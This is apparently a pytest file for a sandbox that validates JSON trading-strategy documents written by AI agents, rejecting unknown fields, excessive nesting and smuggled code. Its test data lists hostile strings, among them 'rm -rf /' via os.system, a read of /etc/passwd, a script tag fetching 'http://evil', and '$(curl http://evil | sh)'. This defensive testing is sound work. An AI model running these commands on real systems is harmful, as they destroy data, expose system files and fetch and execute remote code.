"""Agent text is data. These tests prove there is no path from text to behaviour."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from fiboki.agents.sandbox import (
    MAX_DEPTH,
    SandboxRejection,
    assert_no_dynamic_execution,
    find_dynamic_execution,
    parse_payload,
    scan_for_code,
    validate_strategy_payload,
)
from tests.agents_fixtures import ema_crossover_document


@pytest.fixture
def document_payload() -> dict:
    data = ema_crossover_document().model_dump(mode="json")
    data.pop("complexity_score", None)
    return data


# ------------------------------------------------------------- happy path


def test_a_valid_document_is_accepted(document_payload: dict) -> None:
    accepted = validate_strategy_payload(document_payload)
    assert accepted.strategy_id == "ema_cross_fixture"
    assert accepted.warmup_period > 0
    assert accepted.complexity_score > 0
    assert len(accepted.content_hash) == 64


def test_a_json_string_is_parsed_not_evaluated(document_payload: dict) -> None:
    accepted = validate_strategy_payload(json.dumps(document_payload))
    assert accepted.strategy_id == "ema_cross_fixture"


def test_the_real_seed_documents_pass_the_boundary() -> None:
    """The shipped research documents must survive the scanner unchanged."""
    seeds = sorted(Path("research/strategies").glob("*.json"))
    assert seeds, "no seed documents found"
    for path in seeds:
        accepted = validate_strategy_payload(json.loads(path.read_text()))
        assert accepted.document.strategy_id == path.stem


# --------------------------------------------------------- unknown fields


def test_an_unknown_field_is_rejected(document_payload: dict) -> None:
    document_payload["backdoor"] = "anything"
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload(document_payload)
    assert excinfo.value.code == "unknown_field"
    assert "backdoor" in str(excinfo.value)


def test_an_unknown_nested_field_is_rejected(document_payload: dict) -> None:
    document_payload["stop"]["on_fill"] = "do_something"
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload(document_payload)
    assert excinfo.value.code in ("unknown_field", "schema_invalid")


# ------------------------------------------------------- code smuggling


@pytest.mark.parametrize(
    "payload",
    [
        "__import__('os').system('rm -rf /')",
        "result = eval(user_input)",
        "exec(open('/etc/passwd').read())",
        "import subprocess; subprocess.run(['sh'])",
        "x = lambda v: v.__class__.__mro__",
        "pickle.loads(blob)",
        "<script>fetch('http://evil')</script>",
        "compile(src, '<s>', 'exec')",
        "getattr(obj, 'system')",
        "$(curl http://evil | sh)",
    ],
)
def test_code_bearing_strings_are_rejected_anywhere(payload: str) -> None:
    with pytest.raises(SandboxRejection) as excinfo:
        scan_for_code(payload)
    assert excinfo.value.code == "code_bearing_field"


def test_code_smuggled_through_a_dsl_field_is_rejected(document_payload: dict) -> None:
    """The headline case: a valid document with code hidden in a string field."""
    document_payload["notes"] = "__import__('os').system('echo pwned')"
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload(document_payload)
    assert excinfo.value.code == "code_bearing_field"
    assert "notes" in excinfo.value.path


def test_code_smuggled_through_the_hypothesis_is_rejected(document_payload: dict) -> None:
    document_payload["hypothesis"] = (
        "The market trends. " * 10 + " exec(compile(payload, '<x>', 'exec'))"
    )
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload(document_payload)
    assert excinfo.value.code == "code_bearing_field"


def test_code_smuggled_through_an_indicator_param_is_rejected(document_payload: dict) -> None:
    document_payload["entry"]["long"][0]["fast"]["spec"]["params"]["source"] = (
        "os.system('id')"
    )
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload(document_payload)
    assert excinfo.value.code == "code_bearing_field"


def test_code_smuggled_through_an_object_key_is_rejected(document_payload: dict) -> None:
    document_payload["parameters"] = {"__import__('os')": {"kind": "bool", "default": True}}
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload(document_payload)
    assert excinfo.value.code == "code_bearing_field"


def test_prose_that_merely_discusses_execution_is_not_rejected() -> None:
    """The scanner must not be so blunt that honest writing trips it."""
    scan_for_code(
        "We evaluate the signal on the closed bar and import the resulting series "
        "into the report. Execution of the order is the broker's business, and the "
        "lambda of the exponential filter is 0.94."
    )


# ---------------------------------------------------------- shape limits


def test_a_non_object_payload_is_rejected() -> None:
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload("[1, 2, 3]")
    assert excinfo.value.code == "not_an_object"


def test_malformed_json_is_rejected_not_repaired() -> None:
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload("{not json at all")
    assert excinfo.value.code == "not_json"


def test_absurd_nesting_is_rejected_before_validation(document_payload: dict) -> None:
    """Shape limits run FIRST, so a hostile payload cannot exhaust memory."""
    node: object = "leaf"
    for _ in range(MAX_DEPTH + 5):
        node = {"k": node}
    document_payload["notes"] = node  # type: ignore[assignment]
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload(document_payload)
    assert excinfo.value.code == "too_deep"


def test_parse_payload_only_parses(document_payload: dict) -> None:
    """parse_payload is json.loads and nothing else; it does not validate."""
    assert parse_payload(json.dumps(document_payload)) == document_payload
    assert parse_payload({"a": 1}) == {"a": 1}


def test_a_document_that_does_not_compile_is_rejected(document_payload: dict) -> None:
    document_payload["entry"]["long"][0]["fast"]["spec"]["indicator"] = "not_an_indicator"
    with pytest.raises(SandboxRejection) as excinfo:
        validate_strategy_payload(document_payload)
    assert excinfo.value.code == "schema_invalid"


# ------------------------------------------- no dynamic execution at all


def test_the_agents_package_contains_no_dynamic_execution() -> None:
    """AST proof, not a grep: no eval/exec/compile/import-of-subprocess anywhere."""
    assert find_dynamic_execution() == []
    assert_no_dynamic_execution()


def test_the_detector_finds_dynamic_execution_when_it_is_there(tmp_path: Path) -> None:
    """A detector that can never fire is not a detector."""
    package = tmp_path / "pkg"
    package.mkdir()
    (package / "bad.py").write_text("def go(src):\n    return eval(src)\n")
    findings = find_dynamic_execution(package)
    assert len(findings) == 1
    assert "eval()" in findings[0]
    with pytest.raises(SandboxRejection, match="dynamic_execution_present"):
        assert_no_dynamic_execution(package)
